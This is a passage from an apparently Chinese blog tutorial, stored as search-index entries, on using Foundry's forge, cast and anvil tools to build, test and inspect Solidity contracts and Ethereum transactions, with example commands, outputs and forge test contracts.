合约依赖实现测试用例 contract CounterTest is Test { Counter public counter; // 初始化测试用例 function setUp() public { counter = new Counter(); counter.setNumber(0); } // 基于初始化测试用例 // 断言测试自增后的 counter 的 number 返回值 同等于 1 function testIncrement() public { counter.increment(); assertEq(counter.number(), 1); } // 基于初始化测试用例 // 执行差异测试测试 // forge 测试的过程中 // 为 testSetNumber 函数参数传递不同的 unit256 类型的 x // 达到测试 counter 的 setNumber 函数 为不同的 x 设置不同的数 // 断言 number() 的返回值等同于差异测试的 x 参数 function testSetNumber(uint256 x) public { counter.setNumber(x); assertEq(counter.number(), x); } // 差异测试：参考 https://book.getfoundry.sh/forge/differential-ffi-testing } ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:5:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"执行构建\u0026测试 在项目目录中通过执行 forge build 完成构建 $ forge build [⠒] Compiling... [⠢] Compiling 10 files with 0.8.17 [⠰] Solc 0.8.17 finished in 1.06s Compiler run successful 完成构建后 通过 forge test 完成测试 $ forge test [⠢] Compiling... No files changed, compilation skipped Running 2 tests for test/Counter.t.sol:CounterTest [PASS] testIncrement() (gas: 28312) [PASS] testSetNumber(uint256) (runs: 256, μ: 27609, ~: 28387) Test result: ok. 2 passed; 0 failed; finished in 9.98ms 至此，您已完成上手使用 Foundry 并且初始化一个项目。 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:5:4","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Foundry Cast的进阶使用 主要介绍Foundry Cast的使用，使用Cast在命令行下达到Ethereum (ETH) Blockchain Explorer 的效果。 练习如下目标 查询区块 查询交易 交易解析 账户管理 合约查询 合约交互 编码解析 本地模拟链上交易 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:6:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"区块相关 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:7:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"查询区块 # $PRC_MAIN 替换成需要的RPC地址 cast block-number --rpc-url=$RPC_MAIN 输出结果： 15769241 将环境变量的ETH_PRC_URL设置为 --rpc-url 你就不需要在每个命令行后面增加 --rpc-url=$RPC_MAIN 我这里直接设置为主网 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:7:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"查询区块信息 # cast block \u003cBLOCK\u003e --rpc-url=$RPC_MAIN cast block 15769241 --rpc-url=$RPC_MAIN # 格式化 cast block 15769241 --json --rpc-url=$RPC_MAIN 输出结果： baseFeePerGas 22188748210 difficulty 0 extraData 0x gasLimit 30000000 gasUsed 10595142 hash 0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543 logsBloom 0x1c6150404140580410990400a61d01e30030b00100c2a6310b11b9405d012980125671129881101011501d399081855523a106443aef3ab07148626315f721550290981058030b2af90b213961204c6103d2002a076c9e12d0800475b8231f0d06a20100da57c60aa0c008280128284418503340087c8650104c34500c18aa1c2070878008c21c64207d1424000244811415afc507640448122060644c181204ba412f0af11365020880508105551226004c0801c1840183003a42062a5a2444c13266020c00081440008038492740a8204a0c6c050a29d52405b92e4b20f028a97a604c6b0849ca81c4d06009258b4206217803a168824484deb8513242f082 miner 0x4675C7e5BaAFBFFbca748158bEcBA61ef3b0a263 mixHash 0x09b7a94ef1d6c93caaff49ca8bf387652e0e33e116076b61f4d5ee79f0b91f92 nonce 0x0000000000000000 number 15769241 parentHash 0x95c60d89f2275a6a7b1a9545cf1fb6d8c614402cd7311c82bc7972c177f7812d receiptsRoot 0xe0240d60c448387123e412114cd0165b2af7b926d34bb824f8c544b022aa76f9 sealFields [] sha3Uncles 0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347 size 149912 stateRoot 0xaa3e9d839e99c4791827c81df9c9129028a320432920205f191e3fb261d0951c timestamp 1666026803 totalDifficulty 58750003716598352816469 transactions: [ 0xc4f5c10e4419698edaf7431df464340b389e4b79db959d58f42e82e8d1ed18ae 0xb90edeacf833ac6cb91a326c775ed86d8047a467404bd8c69782d2260983eaad 0x6f280650e35238ab930c9a0f3163443fffe2efedc5b553f408174d4bcd89cd8d 0x2e0eafea64aaf2f53240a16b11a4f250ba74ab9ca5a1a90e6f2a6e92185877d2 0x34f41d22ed8209da379691640cec5bfb8bf9404ad0f7264709b7959d61532343 0x7569ab5ce2d1ca13a0c65ad52cc901dfc186e8ff8800793550b97760cbe34db2 0xcdeef0ffe859fcf96fb52e22a9789295c6f1a94280df9faf0ebb9d52abefb3e7 0x00d6793f3dbdd616351441b9e3da9a0de51370174e0d9383b4aae5c3c9806c2a 0xff3daf63a431af021351d3da5f2f39a894352328d7f3df96afab1888f5a7093f 0x7938399bee5293c384831c8e5aa698cdb491d568f9ebfb6d5c946f4ef7bf7e51 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 0x0435d78a1b62484fbe3a7680d68ba4bdf0d692f087f4a6b70eb377421c58a5dd 0xe16d1fa4d60cca7447850337c63cdf7b888318cc1bbb893b115f262dc01132d7 0x44af4f696dcfedee682d7e511ad2469780443052565eea731b86b652a175c05e 0xe88732f92ac376efb6e7517e66fc586447e0d065b8686556f2c1a7c3b7a519ce 0x7ee890b096e97fc0c7e3cf74e0f0402532e0f3b8fa0e0c494d3d691d031f57e7 ...] ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:7:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"交易相关 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"查询交易 # 跟ethersjs中的 provider.getTransaction 类似 # cast tx \u003cHASH\u003e [FIELD] --rpc-url=$RPC # 跟ethersjs中的 provider.getTransactionReceipt类似 # cast receipt \u003cHASH\u003e [FIELD] --rpc-url=$RPC cast tx 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 --rpc-url=$RPC cast receipt 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 --rpc-url=$RPC # 只获取logs cast receipt 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 logs --rpc-url=$RPC 第一条命令行结果： blockHash 0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543 blockNumber 15769241 from 0x9C0649d7325990D98375F7864eA167B5EAdCD46a gas 313863 gasPrice 35000000000 hash 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 input 0x38ed173900000000000000000000000000000000000000000000000332ca1b67940c000000000000000000000000000000000000000000000000000416b4849e6ba1475000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a00000000000000000000000000000000000000000000000000000000634d91c1000000000000000000000000000000000000000000000000000000000000000200000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb0000000000000000000000001bbf25e71ec48b84d773809b4ba55b6f4be946fb nonce 14 r 0x288aef25af73a4d1916f8d37107ef5f24729a423f23acc38920829c4180fe794 s 0x7644d26a91da02ff1e774cc821febf6387b8ee9f3e3085140b781819d0d8ede0 to 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D transactionIndex 10 v 38 value 0 第二行命令行结果： blockHash 0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543 blockNumber 15769241 contractAddress cumulativeGasUsed 805082 effectiveGasPrice 35000000000 gasUsed 114938 logs [{\"address\":\"0x97be09f2523b39b835da9ea3857cfa1d3c660cbb\",\"topics\":[\"0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\",\"0x0000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a\",\"0x000000000000000000000000f848e97469538830b0b147152524184a255b9106\"],\"data\":\"0x00000000000000000000000000000000000000000000000332ca1b67940c0000\",\"blockHash\":\"0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543\",\"blockNumber\":\"0xf09e99\",\"transactionHash\":\"0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0\",\"transactionIndex\":\"0xa\",\"logIndex\":\"0x2\",\"removed\":false},{\"address\":\"0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb\",\"topics\":[\"0x06b541ddaa720db2b10a4d0cdac39b8d360425fc073085fac19bc82614677987\",\"0x000000000000000000000000f848e97469538830b0b147152524184a255b9106\",\"0x000000000000000000000000f848e97469538830b0b147152524184a255b9106\",\"0x0000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a\"],\"data\":\"0x0000000000000000000000000000000000000000000000044b0a580cbdcfc0d90000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\",\"blockHash\":\"0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543\",\"blockNumber\":\"0xf09e99\",\"transactionHash\":\"0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0\",\"transactionIndex\":\"0xa\",\"logIndex\":\"0x3\",\"removed\":false},{\"address\":\"0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb\",\"topics\":[\"0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\",\"0x000000000000000000000000f848e97469538830b0b147152524184a255b9106\",\"0x0000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a\"],\"data\":\"0x0000000000000000000000000000000000000000000000044b0a580cbdcfc0d9\",\"blockHash\":\"0x016e71f4130bac96a20761acbc0ba82a77c26f85513f1661adfd406d1c809543\",\"blockNumber\":\"0xf09e99\",\"transactionHash\":\"0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0\",\"transactionIndex\":\"0xa\",\"logIndex\":\"0x4\",\"removed\":false},{\"address\":\"0xf848e97469538830b0b147152524184a255b9106\",\"topics\":[\"0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1\"],\"data\":\"0x00000000000000000000000000000000000","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"交易解析 Cast 会从 Ethereum Signature Database 解析对应的方法名称 # cast 4byte \u003cSELECTOR\u003e 解析交易的名称 cast 4byte 0x38ed1739 输出结果： swapExactTokensForTokens(uint256,uint256,address[],address,uint256) ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"交易签名 使用 Keccak-256 能够计算出方法名 函数名为被调函数原型[1]的Keccak-256哈希值的前4个字节。这允许EVM准确无误地识别被调函数。 交易签名： # cast sig \u003cSIG\u003e cast sig \"swapExactTokensForTokens(uint256,uint256,address[],address,uint256)\" 输出结果： 0x38ed1739 所以你可以看到最终都是 0x38ed1739 有些方法名称可能没有，你可以通过cast upload-signature \u003cSIG\u003e 上传给 Ethereum Signature Database ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"交易解码 # 获得calldata cast tx 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 input --rpc-url=$RPC # 可以通过该方法decode交易的数据，类似etherscan中的decode方法 # cast pretty-calldata \u003cCALLDATA\u003e cast pretty-calldata 0x38ed173900000000000000000000000000000000000000000000000332ca1b67940c000000000000000000000000000000000000000000000000000416b4849e6ba1475000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a00000000000000000000000000000000000000000000000000000000634d91c1000000000000000000000000000000000000000000000000000000000000000200000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb0000000000000000000000001bbf25e71ec48b84d773809b4ba55b6f4be946fb 输出结果： Possible methods: - swapExactTokensForTokens(uint256,uint256,address[],address,uint256) ------------ [0]: 00000000000000000000000000000000000000000000000332ca1b67940c0000 [1]: 00000000000000000000000000000000000000000000000416b4849e6ba14750 [2]: 00000000000000000000000000000000000000000000000000000000000000a0 [3]: 0000000000000000000000009c0649d7325990d98375f7864ea167b5eadcd46a [4]: 00000000000000000000000000000000000000000000000000000000634d91c1 [5]: 0000000000000000000000000000000000000000000000000000000000000002 [6]: 00000000000000000000000097be09f2523b39b835da9ea3857cfa1d3c660cbb [7]: 0000000000000000000000001bbf25e71ec48b84d773809b4ba55b6f4be946fb ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:4","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"模拟运行 # Usage: cast run --rpc-url \u003cURL\u003e \u003cTXHASH\u003e cast run 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 运行结果： 可以在结果中看到运行消耗的gas，以及方法顺序调用的过程，以及释放的emit的事件。通过这个可以了解一个hash的内在过程。类似 BlockSec Building BlockChain Security Infrastructure 和 Tenderly | Ethereum Developer Platform 可以结合使用。 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:8:5","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"账户管理 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:9:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"新建账户 # 新建一个账号 # cast wallet new [OUT_DIR] cast wallet new # 新建一个keystore的账号，带有密码 # cast wallet new \u003cPATH\u003e cast wallet new ~/Downloads 第一条命令行结果输出： Successfully created new keypair. Address: 0xDD20b18E001A80d8b27B8Caa94EeAC884D1c**** Private Key: edb4444199bddea91879c0214af27c0c7f99****bf18e46ba4078a39ccdbe0bc 第二条命令行结果输出： Enter secret: Created new encrypted keystore file: `/Users/EasyPlux/Downloads/b5832df5-21e9-4959-8c85-969eec9c0***`\\nPublic Address of the key: 0x58c1C8f6A7D92A9b20A5343949cd624570Ab**** ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:9:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"账户签名 # 两种方法都可以使用签名，第一种载入刚才生成的keystore私钥，第二种直接输入自己的私钥。 cast wallet sign \u003cMESSAGE\u003e --keystore=\u003cPATH\u003e cast wallet sign \u003cMESSAGE\u003e -i ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:9:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"账户验证 cast wallet verify --address \u003cADDRESS\u003e \u003cMESSAGE\u003e \u003cSIGNATURE\u003e ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:9:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"合约交互 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:10:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"获取合约 cast etherscan-source \u003ccontract address\u003e cast etherscan-source 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 --etherscan-api-key='key' ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:10:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"下载合约 #cast etherscan-source -d \u003cpath\u003e # 我这里已经将$WETH的地址写入环境变量，如果没写入的，可以写成合约地址 cast etherscan-source $WETH -d ~/Downloads ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:10:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"调用合约 调用 WETH合约的balanceOf方法,查看0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2账号的余额 #cast call [OPTIONS] [TO] [SIG] [ARGS]... [COMMAND] --rpc-url=$RPC cast call $WETH \"balanceOf(address)\" 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 --rpc-url=$RPC # 输出 # 0x0000000000000000000000000000000000000000000000230d12770f2845219c # 格式化输出 在参数后面加一个返回值的格式 cast call $WETH \"balanceOf(address)(uint256)\" 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 --rpc-url=$RPC # 输出 # 646577988758891995548 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:10:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"解析ABI 可以根据ABI反向解析出solidity代码 # cast interface [OPTIONS] \u003cPATH_OR_ADDRESS\u003e cast interface ./weth.abi ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:10:4","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"编码解码 cast --to-hex cast --to-dec cast --to-unit cast --to-wei cast --to-rlp cast --from-rlp ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:11:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Tips ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:12:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"设置ETH_PRC_URL 将环境变量的ETH_PRC_URL设置为 --rpc-url 你就不需要在每个命令行后面增加 --rpc-url=$RPC_MAIN 我这里直接设置为主网 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:12:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"设置ETHERSCAN_API_KEY 设置ETHERSCAN_API_KEY环境变量可以直接代替 --etherscan-api-key ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:12:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"JSON格式化 加上 --json 可以格式化输出 cast block 15769241 --json --rpc-url=$RPC_MAIN ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:12:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Anvil本地节点的使用 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:13:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"基本命令行 anvil 跟 hardhat 还有 truffle中的ganache都是一样的，是一个本地的eth节点，同样拥有各种fork的功能。 anvil anvil --accounts=\u003cNUM\u003e --balance=\u003cNUM\u003e anvil --mnemonic=\u003cMNEMONIC\u003e anvil --fork-url=$RPC --fork-block-number=\u003cBLOCK\u003e ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:13:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"PRC的使用 anvil_* -\u003e hardhat_* anvil_impersonateAccount anvil_setStorageAt ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:13:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"Forge命令行进阶的使用 代码存放在WTFSolidity/Topics/Tools/TOOL07_Foundry/hello_wtf 代码目录树如下： . ├── broadcast │ └── Counter.s.sol ├── foundry.toml # foundry配置文件 ├── lib │ └── forge-std ├── node_modules # 使用npm依赖包目录，你也可以直接使用forge install │ └── @openzeppelin ├── package-lock.json ├── package.json ├── script │ └── Counter.s.sol # 脚本合约 ├── src │ └── Counter.sol └── test ├── Counter.t.sol └── Test.t.sol # 测试合约 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:14:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"初始化项目 forge init \u003cdir_name\u003e forge init --template \u003ctemplate_path\u003e \u003cdir_name\u003e ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:14:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"热更新 forge build -w ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:15:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"测试 # 三个v会现实详细的log信息 forge test -vvv # 热更新模式 forge test -vvv -w # log打印 需要 - vv 2个v以上才可以 使用 console2.log(“test”) 来打印 function testSetNumber(uint256 x) public { console2.log(\"testNumber: %s==============\", x); counter.setNumber(x); assertEq(counter.number(), x); } 使用 emit log 来打印 function testNumberIs42() public { emit log(\"test\"); assertEq(testNumber, 42); } 改变状态 function testCheatCode()public console2.Log(\"before:\"block.timestamp); vm.warp(1000); console2.log(\"after:\"block.timestamp); 改变msg.sender 【可以模拟管理员账户】 // 只有第一次有影响 vm.prank(address) // 多次影响 vm.startPrank(address) ...code vm.stopPrank() 改变存储状态 function testCheatCode()public{ console2.Log(\"before:\"alice.balance); vm.deal(alice,1 ether); console2.Log(\"after:\"alice.balance); } ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:15:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"安装插件 ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:16:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"使用forge安装插件 forge install [OPTIONS] \u003cgithub username\u003e/\u003cgithub project\u003e@\u003ctag\u003e ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:16:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"使用npm安装插件 npm init -y npm i @openzeppelin/contracts // yarn add @openzeppelin/contracts 安装完成之后需要配置foundry.toml方法，在libs中添加 node_modules文件夹。 [profile.default] src = 'src' out = 'out' libs = ['lib','node_modules'] ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:16:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"测试一 新建test/Test.t.sol // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.13; import \"forge-std/Test.sol\"; import \"../src/Counter.sol\"; // 导入IERC20的接口，通过该接口可以调用对应的方法 import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; contract IERC20Test is Test { // 声明Counter合约对象变量 Counter public counter; // 声明一个地址变量 address public alice; // 声明一个msgSender address public msgSender; // 声明帮助合约函数 Helper public h; //定义一个IERC20 合约对象 IERC20 public dai; function setUp() public { // new测试合约对象 counter = new Counter(); // 调用对象方法 counter.setNumber(0); // new helper对象 h = new Helper(); alice = address(10086); console2.log(alice); dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); } // 测试给合约地址转账 function testCheatCode() public { console2.log(\"before:\", dai.balanceOf(alice)); deal(address(dai), alice,1 ether); console2.log(\"after:\", dai.balanceOf(alice)); } // 测试改变合约msg.sender function testCheatAddress() public { console2.log(\"before:\", h.whoCalled()); vm.prank(address(1)); console2.log(\"after:\", h.whoCalled()); } } contract Helper { function whoCalled() public view returns (address) { return msg.sender; } } 运行测试： 因为本地没有dai的部署合约，所以我们直接fork主网， -vvv可以现实console2.log，-w表示watch模式。 forge test -vvv --fork-url=$ETH_RPC_URL -w 输出结果： Running 2 tests for test/Test.t.sol:IERC20Test [PASS] testCheatAddress() (gas: 12873) Logs: 0x0000000000000000000000000000000000002766 before: 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84 after: 0x0000000000000000000000000000000000000001 [PASS] testCheatCode() (gas: 153596) Logs: 0x0000000000000000000000000000000000002766 before: 0 after: 1000000000000000000 Test result: ok. 2 passed; 0 failed; finished in 5.61s ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:17:0","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"代码中fork网络 function testCodeFork() public { console2.log(address(dai)); string memory rpc = vm.envString(\"ETH_RPC_URL\"); uint256 mainnet = vm.createFork(rpc); vm.selectFork(mainnet); // 这边下面开始就是直接fork网络了 console2.log(\"before:\",dai.balanceOf(alice)); deal(address(dai),alice,1 ether); console2.log(\"after:\",dai.balanceOf(alice)); } ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:17:1","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"从代码中读取环境变量 // 通过 vm.envAddress 获取环境变量中的地址 dai = IERC20(vm.envAddress(\"DAI\")); ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:17:2","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"完整代码 // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.13; import \"forge-std/Test.sol\"; import \"../src/Counter.sol\"; // 导入IERC20的接口，通过该接口可以调用对应的方法 import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; contract IERC20Test is Test { // 声明Counter合约对象变量 Counter public counter; // 声明一个地址变量 address public alice; // 声明一个msgSender address public msgSender; // 声明帮助合约函数 Helper public h; //定义一个IERC20 合约对象 IERC20 public dai; function setUp() public { // new测试合约对象 counter = new Counter(); // 调用对象方法 counter.setNumber(0); // new helper对象 h = new Helper(); alice = address(10086); console2.log(alice); // 通过 vm.envAddress 获取环境变量中的地址 dai = IERC20(vm.envAddress(\"DAI\")); } // 测试给合约地址转账 function testCheatCode() public { console2.log(\"before:\", dai.balanceOf(alice)); deal(address(dai), alice,1 ether); console2.log(\"after:\", dai.balanceOf(alice)); } // 测试改变合约msg.sender function testCheatAddress() public { console2.log(\"before:\", h.whoCalled()); vm.prank(address(1)); console2.log(\"after:\", h.whoCalled()); } function testCodeFork() public { console2.log(address(dai)); string memory rpc = vm.envString(\"ETH_RPC_URL\"); uint256 mainnet = vm.createFork(rpc); vm.selectFork(mainnet); // 这边下面开始就是直接fork网络了 console2.log(\"before:\",dai.balanceOf(alice)); deal(address(dai),alice,1 ether); console2.log(\"after:\",dai.balanceOf(alice)); } } contract Helper { function whoCalled() public view returns (address) { return msg.sender; } } ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:17:3","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"vm.sol vm.sol 中还有很多封装好的方法可以直接使用 // Sets the *next* call's msg.sender to be the input address function prank(address) external; // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called function startPrank(address) external; // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input function prank(address,address) external; // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input function startPrank(address,address) external; // Resets subsequent calls' msg.sender to be `address(this)` function stopPrank() external; // Sets an address' balance, (who, newBalance) function deal(address, uint256) external; // Sets an address' code, (who, newCode) function etch(address, bytes calldata) external; // Expects an error on next call function expectRevert(bytes calldata) external; function expectRevert(bytes4) external; function expectRevert() external; // Records all storage reads and writes function record() external; // Gets all accessed reads and write slot from a recording session, for a given address function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes); ","date":"2022-06-19","objectID":"/posts/tools-foundry-introduce.html:17:4","tags":["tools"],"title":"Foundry，以Solidity为中心的开发工具包","uri":"/posts/tools-foundry-introduce.html"},{"categories":["工具"],"content":"运行脚本 forge script [OPTIONS] \u003cPATH\u003e [ARGS]... forge script script/Counter.s.sol:CounterScript script/Counter.s.sol 脚本代码 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; contract CounterScript is Script { // 每次初始化会运行 function setUp() public { console2.log(\"setup \"); } function run() public { 